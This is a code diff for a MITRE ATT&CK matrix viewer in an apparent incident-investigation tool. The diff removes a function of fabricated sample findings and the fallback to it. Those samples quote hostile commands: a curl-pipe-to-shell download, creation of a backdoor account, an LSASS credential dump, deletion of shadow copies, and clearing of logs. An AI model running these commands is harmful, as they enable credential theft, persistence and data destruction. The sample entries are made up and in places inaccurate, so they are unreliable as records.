@@ -991,185 +991,6 @@ function extractTechniquesFromReport(data) {
 }
 
 // ============================================
-// Build sample data if no API available
-// ============================================
-function buildSampleData() {
-    return {
-        "T1190": [
-            { type:"file", text:"/var/log/apache2/error.log - SQL injection attempt: /login?id=1' OR '1'='1" },
-            { type:"ioc", text:"HTTP request to /wp-admin from 185.220.101.34" },
-            { type:"finding", text:"Apache Struts CVE-2023-44487 exploitation detected via WAF logs" }
-        ],
-        "T1059": [
-            { type:"file", text:"/home/admin/.bash_history - curl http://10.0.0.5/payload.sh | sh" },
-            { type:"file", text:"C:\\Windows\\Temp\\run.bat - net user hacker P@ss123 /add" },
-            { type:"finding", text:"PowerShell execution policy bypass: powershell -ep bypass -f update.ps1" }
-        ],
-        "T1078": [
-            { type:"finding", text:"Login from 203.0.113.50 using svc_backup account outside business hours" },
-            { type:"ioc", text:"svc_backup authenticated from 203.0.113.50 at 02:14 UTC" }
-        ],
-        "T1566": [
-            { type:"file", text:"/mail/inbox/msg_0042.eml - attachment: Q3_Report.xlsx.lnk" },
-            { type:"ioc", text:"Phishing sender: account-verify@micros0ft-portal.com" },
-            { type:"finding", text:"Spear-phishing email targeting finance team with macro-enabled document" }
-        ],
-        "T1055": [
-            { type:"file", text:"/proc/4482/maps - injected dll: C:\\Windows\\Temp\\keylog.dll" },
-            { type:"finding", text:"Process hollowing detected: svchost.exe spawned from unusual parent explorer.exe" }
-        ],
-        "T1053": [
-            { type:"file", text:"/etc/cron.d/persist - */5 * * * * root /tmp/beacon" },
-            { type:"finding", text:"Scheduled task 'WindowsUpdate' created at 03:00 daily executing C:\\Users\\Public\\svchost.exe" }
-        ],
-        "T1562": [
-            { type:"file", text:"/var/log/syslog - systemctl stop fail2han" },
-            { type:"finding", text:"Windows Defender real-time protection disabled via Set-MpPreference -DisableRealtime 1" },
-            { type:"finding", text:"Audit policy cleared: auditpol /clear" }
-        ],
-        "T1070": [
-            { type:"file", text:"/var/log/auth.log - last 48h of entries deleted" },
-            { type:"finding", text:"Event log cleared: wevtutil cl Security at 2024-01-15T03:12:07Z" }
-        ],
-        "T1003": [
-            { type:"file", text:"C:\\Windows\\Temp\\lsass.dmp - LSASS memory dump (847MB)" },
-            { type:"file", text:"/tmp/mimikatz_output.txt - sekurlsa::logonpasswords" },
-            { type:"finding", text:"Credential dumping via procdump: procdump -ma lsass.exe lsass.dmp" }
-        ],
-        "T1087": [
-            { type:"finding", text:"net user /domain executed on DC01 at 2024-01-14T22:05:31Z" },
-            { type:"finding", text:"ADSI query for all domain admin members via Get-ADGroupMember" }
-        ],
-        "T1082": [
-            { type:"finding", text:"Systeminfo executed on WORKSTATION-04" },
-            { type:"file", text:"/tmp/sys_info.txt - uname -a output" }
-        ],
-        "T1049": [
-            { type:"finding", text:"netstat -ano output showing C2 connections to 185.220.101.34:443" },
-            { type:"ioc", text:"Established TCP connection: 10.0.4.12:49832 -> 185.220.101.34:443" }
-        ],
-        "T1021": [
-            { type:"file", text:"/var/log/auth.log - SSH session from 10.0.2.5 as root at 22:41 UTC" },
-            { type:"finding", text:"RDP logon from 10.0.2.5 to DB-SERVER-01 using svc_admin credentials" }
-        ],
-        "T1570": [
-            { type:"file", text:"C$ share access: \\10.0.2.8\C$\Windows\Temp\mimikatz.exe copied" },
-            { type:"finding", text:"Admin share used to copy payload to WORKSTATION-07" }
-        ],
-        "T1071": [
-            { type:"ioc", text:"HTTPS C2 beacon to api.update-service[.]cloud every 45s" },
-            { type:"file", text:"/etc/hosts - 185.220.101.34 api.update-service.cloud" },
-            { type:"finding", text:"DNS queries for x7f3a2b.update-service.cloud with TXT record responses" }
-        ],
-        "T1573": [
-            { type:"ioc", text:"TLS 1.2 connection to 185.220.101.34 with self-signed cert CN=update-service" },
-            { type:"finding", text:"Encrypted channel using AES-256-CBC with key derived from DH exchange" }
-        ],
-        "T1105": [
-            { type:"file", text:"/tmp/cobalt_strike_beacon downloaded from 185.220.101.34/payload.bin" },
-            { type:"finding", text:"CertUtil -urlcache -split -f http://10.0.0.5/tools/ps.exe download detected" }
-        ],
-        "T1486": [
-            { type:"file", text:"C:\\Users\\Public\\README_DECRYPT.txt - ransom note demanding 2 BTC" },
-            { type:"finding", text:"Files encrypted with .locked extension across 47 file shares" },
-            { type:"ioc", text:"Encryption key exchange via Tor hidden service: xyz123.onion/pay" }
-        ],
-        "T1490": [
-            { type:"finding", text:"vssadmin delete shadows /all /quiet executed at 2024-01-15T03:08:00Z" },
-            { type:"file", text:"wbadmin delete catalog output in command history" }
-        ],
-        "T1489": [
-            { type:"finding", text:"Service 'MSSQLSERVER' stopped unexpectedly at 2024-01-15T02:55:00Z" },
-            { type:"file", text:"net stop WinDefend executed from C:\\Windows\\Temp\\stop.bat" }
-        ],
-        "T1036": [
-            { type:"file", text:"C:\\Windows\\Temp\\svchost.exe - masquerading as system binary (wrong directory)" },
-            { type:"finding", text:"Malicious binary named 'chrome_update.exe' placed in C:\\Users\\Public\\" }
-        ],
-        "T1027": [
-            { type:"finding", text:"Base64-encoded PowerShell payload decoded to reflective DLL injection" },
-            { type:"file", text:"payload.enc - XOR-encrypted with key 0x4A, decoded to PE executable" }
-        ],
-        "T1098": [
-            { type:"finding", text:"svc_backup account added to Domain Admins group via net group command" },
-            { type:"ioc", text:"Password changed for svc_backup at 2024-01-14T23:50:00Z" }
-        ],
-        "T1547": [
-            { type:"file", text:"Registry: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - 'update'='C:\\Users\\Public\\svchost.exe'" },
-            { type:"finding", text:"Startup folder persistence: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\update.lnk" }
-        ],
-        "T1110": [
-            { type:"finding", text:"47,832 failed RDP logon attempts for Administrator from 203.0.113.50" },
-            { type:"ioc", text:"Brute force source IP: 203.0.113.50 (5 failed attempts/second)" }
-        ],
-        "T1056": [
-            { type:"file", text:"C:\\Windows\\Temp\\keylog.dll - keystroke logger DLL loaded into explorer.exe" },
-            { type:"finding", text:"Clipboard monitoring via SetClipboardViewer API hook detected" }
-        ],
-        "T1048": [
-            { type:"ioc", text:"DNS exfiltration: 4.2MB of encoded data in TXT query responses to c2.example.com" },
-            { type:"finding", text:"Data exfiltrated via HTTPS POST to 185.220.101.34/api/upload (2.1GB total)" }
-        ],
-        "T1560": [
-            { type:"file", text:"C:\\Windows\\Temp\\archive.zip - password-protected ZIP of document share" },
-            { type:"finding", text:"RAR archive created: rar a -p -r C:\\Users\\Public\\data.rar C:\\Users\\Documents\\" }
-        ],
-        "T1083": [
-            { type:"finding", text:"dir /s /b C:\\Users\\*.docx executed on WORKSTATION-04" },
-            { type:"file", text:"find / -name '*.conf' 2>/dev/null - output in /tmp/scan_results.txt" }
-        ],
-        "T1018": [
-            { type:"finding", text:"nltest /dclist:corp.local executed for domain controller enumeration" },
-            { type:"ioc", text:"LDAP query: (objectClass=computer) returning 142 domain machines" }
-        ],
-        "T1135": [
-            { type:"finding", text:"net use \\FILE-SERVER-01\C$ executed from compromised admin workstation" },
-            { type:"file", text:"/etc/fstab - NFS mount entries for 10.0.1.0/24 file shares" }
-        ],
-        "T1114": [
-            { type:"file", text:"/mail/dump/admin@corp.local.pst - 2.4GB Outlook data file exfiltrated" },
-            { type:"finding", text:"Exchange Web Services (EWS) API used to pull all inbox items for executive account" }
-        ],
-        "T1123": [
-            { type:"finding", text:"Microphone access requested by unknown process: audiodg.exe child process" }
-        ],
-        "T1113": [
-            { type:"file", text:"C:\\Windows\\Temp\\screen_cap\\frame_0047.png - screenshot of financial dashboard" },
-            { type:"finding", text:"GDI screen capture API calls from injected thread in explorer.exe" }
-        ],
-        "T1046": [
-            { type:"finding", text:"nmap -sV -p 22,80,443,3389 10.0.0.0/24 executed from compromised host" },
-            { type:"ioc", text:"Port scan from 10.0.4.12 targeting 10.0.1.0/24 (SYN scan detected)" }
-        ],
-        "T1132": [
-            { type:"finding", text:"C2 commands encoded in Base64 within HTTP Cookie header values" }
-        ],
-        "T1095": [
-            { type:"ioc", text:"ICMP tunnel detected: 1,400-byte packets at regular intervals to 185.220.101.34" }
-        ],
-        "T1552": [
-            { type:"file", text:"C:\\Users\\admin\\.ssh\\id_rsa - private SSH key found in user profile" },
-            { type:"file", text:"/etc/shadow - credential file accessed via privilege escalation" },
-            { type:"finding", text:"Unattended.xml containing plaintext credentials at C:\\Windows\\Panther\\" }
-        ],
-        "T1558": [
-            { type:"finding", text:"Kerberoasting: Requesting service tickets for SPNs with admin privileges" },
-            { type:"ioc", text:"TGS-REQ for MSSQLSvc/db-server-01.corp.local:1433 - crackable hash obtained" }
-        ],
-        "T1012": [
-            { type:"finding", text:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
-            { type:"finding", text:"Reg query HKLM\\SAM for password hashes" }
-        ],
-        "T1496": [
-            { type:"finding", text:"Cryptominer process xmrig.exe consuming 98% CPU on WORKSTATION-07" },
-            { type:"ioc", text:"Mining pool connection: stratum+tcp://pool.minexmr[.]com:443" }
-        ],
-        "T1203": [
-            { type:"finding", text:"Office document macro exploitation: CVE-2023-36884 via malicious Excel file" }
-        ]
-    };
-}
-
 // ============================================
 // Render the matrix
 // ============================================
@@ -1521,21 +1342,16 @@ async function init() {
                 setStatus('', `Loaded: ${techCount} techniques from case report`);
                 document.getElementById('caseBadge').textContent = `CASE: ${caseId} (API)`;
             } else {
-                // API returned data but no techniques found - fall back to sample
-                setStatus('error', 'No MITRE techniques in report — showing sample data');
-                detectedTechniques = buildSampleData();
-                document.getElementById('caseBadge').textContent = `CASE: ${caseId} (SAMPLE)`;
+                // No MITRE techniques in report
+                setStatus('empty', 'No MITRE techniques found in this case');
             }
         } else {
-            // No API available - use sample data
-            setStatus('error', 'API unavailable — showing sample investigation data');
-            detectedTechniques = buildSampleData();
-            document.getElementById('caseBadge').textContent = `CASE: ${caseId} (SAMPLE)`;
+            // API unavailable
+            setStatus('error', 'Case report API unavailable');
         }
     } catch(err) {
         console.error('Error loading case data:', err);
-        setStatus('error', 'Error loading data — showing sample');
-        detectedTechniques = buildSampleData();
+        setStatus('error', 'Error loading case data');
     }
 
     // Render
